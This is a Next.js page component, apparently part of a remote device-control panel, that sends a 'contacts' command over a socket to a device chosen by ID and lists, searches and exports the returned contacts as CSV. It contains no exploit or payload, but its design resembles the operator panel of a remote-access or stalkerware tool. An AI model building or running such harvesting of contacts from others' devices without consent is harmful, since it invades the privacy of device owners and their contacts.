'use client';

import { useState, useEffect, useMemo } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
import { getInitials, exportToCSV } from '@/lib/utils';
import { Users, ArrowLeft, Download, RefreshCw, Search, X, Phone } from 'lucide-react';

interface Contact {
    id: string;
    name: string;
    phoneNo: string;
}

export default function ContactsPage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showTimeout, showConnection } = useNotification();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [contacts, setContacts] = useState<Contact[]>([]);
    const [isLoading, setIsLoading] = useState(false);
    const [searchQuery, setSearchQuery] = useState('');

    useEffect(() => {
        initSocket(deviceId);
        showConnection(true, 'Connected to device');

        onResult((data: SocketResult) => {
            let contactsArray = null;

            if (data.contacts?.contactsList) {
                contactsArray = data.contacts.contactsList;
            } else if (data.contactsList) {
                if (Array.isArray(data.contactsList)) {
                    contactsArray = data.contactsList;
                } else if ((data.contactsList as any).contactsList) {
                    contactsArray = (data.contactsList as any).contactsList;
                }
            }

            if (contactsArray && Array.isArray(contactsArray)) {
                const processed = contactsArray.map((contact, idx) => ({
                    id: `${idx}-${contact.phoneNo}-${Date.now()}`,
                    name: String(contact.name || 'Unknown'),
                    phoneNo: String(contact.phoneNo || 'Unknown'),
                }));
                setContacts(processed);
                setIsLoading(false);
                showSuccess('Contacts Updated', `Loaded ${processed.length} contacts`);
            }
        });

        return () => disconnectSocket();
    }, [deviceId]);

    const handleRefresh = () => {
        setIsLoading(true);
        setSearchQuery('');
        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.CONTACTS },
        });

        setTimeout(() => {
            if (isLoading) {
                setIsLoading(false);
                showTimeout('Request Timeout', 'Server took too long to respond', handleRefresh);
            }
        }, 60000);
    };

    const handleExport = () => {
        if (contacts.length === 0) {
            showError('No Data', 'No contacts to export');
            return;
        }

        exportToCSV(
            contacts,
            ['Name', 'Phone Number'],
            ['name', 'phoneNo'],
            `Contacts_${new Date().toISOString().split('T')[0]}.csv`
        );
        showSuccess('Exported', 'Contacts saved as CSV');
    };

    const filteredContacts = useMemo(() => {
        if (!searchQuery) return contacts;
        const q = searchQuery.toLowerCase();
        return contacts.filter(c =>
            c.name.toLowerCase().includes(q) || c.phoneNo.includes(q)
        );
    }, [contacts, searchQuery]);

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button onClick={() => router.back()} className="p-2 rounded-xl bg-purple-500/15">
                                <ArrowLeft className="w-5 h-5 text-purple-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">Contacts</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <button onClick={handleExport} className="p-3 rounded-full bg-white/10">
                            <Download className="w-5 h-5 text-white" />
                        </button>
                    </div>
                </div>
            </div>

            {/* Stats Card */}
            <div className="p-0.5 rounded-2xl mb-6" style={{ background: 'linear-gradient(135deg, #3b82f6, #2563eb)' }}>
                <div className="bg-[#1a0b2e] rounded-[0.875rem] p-5 flex items-center gap-4">
                    <Users className="w-6 h-6 text-white" />
                    <div>
                        <p className="text-3xl font-bold text-white">{contacts.length}</p>
                        <p className="text-gray-400 text-sm">Total Contacts</p>
                    </div>
                </div>
            </div>

            {/* Search */}
            {contacts.length > 0 && (
                <div className="ms-card flex items-center gap-3 px-4 py-3 mb-4">
                    <Search className="w-5 h-5 text-gray-500" />
                    <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Search contacts..."
                        className="flex-1 bg-transparent text-white outline-none"
                    />
                    {searchQuery && (
                        <button onClick={() => setSearchQuery('')}>
                            <X className="w-5 h-5 text-gray-500" />
                        </button>
                    )}
                </div>
            )}

            {/* Refresh Button */}
            <button
                onClick={handleRefresh}
                disabled={isLoading}
                className={`w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-3 mb-6 ${isLoading
                        ? 'bg-gray-600 text-gray-300'
                        : 'gradient-primary text-white'
                    }`}
            >
                <RefreshCw className={`w-5 h-5 ${isLoading ? 'animate-spin' : ''}`} />
                {isLoading ? 'Loading...' : 'Refresh Contacts'}
            </button>

            {/* Contact List */}
            {filteredContacts.length === 0 && contacts.length === 0 ? (
                <div className="text-center py-16">
                    <Users className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                    <p className="text-white font-semibold mb-1">No contacts available</p>
                    <p className="text-gray-400 text-sm">Tap refresh to load contacts</p>
                </div>
            ) : filteredContacts.length === 0 ? (
                <div className="text-center py-16">
                    <Search className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                    <p className="text-white font-semibold mb-1">No results found</p>
                    <p className="text-gray-400 text-sm">Try a different search term</p>
                </div>
            ) : (
                <div className="space-y-3">
                    {filteredContacts.map((contact) => (
                        <div key={contact.id} className="ms-card p-4 flex items-center gap-4">
                            <div className="w-11 h-11 rounded-full bg-purple-500 flex items-center justify-center">
                                <span className="text-white font-bold">{getInitials(contact.name)[0]}</span>
                            </div>
                            <div className="flex-1 min-w-0">
                                <p className="font-semibold text-white truncate">{contact.name}</p>
                                <div className="flex items-center gap-1.5 text-gray-400 text-sm">
                                    <Phone className="w-3 h-3" />
                                    <span className="truncate">{contact.phoneNo}</span>
                                </div>
                            </div>
                        </div>
                    ))}
                    <p className="text-center text-gray-400 text-sm py-4">
                        Showing {filteredContacts.length} of {contacts.length} contacts
                    </p>
                </div>
            )}
        </div>
    );
}
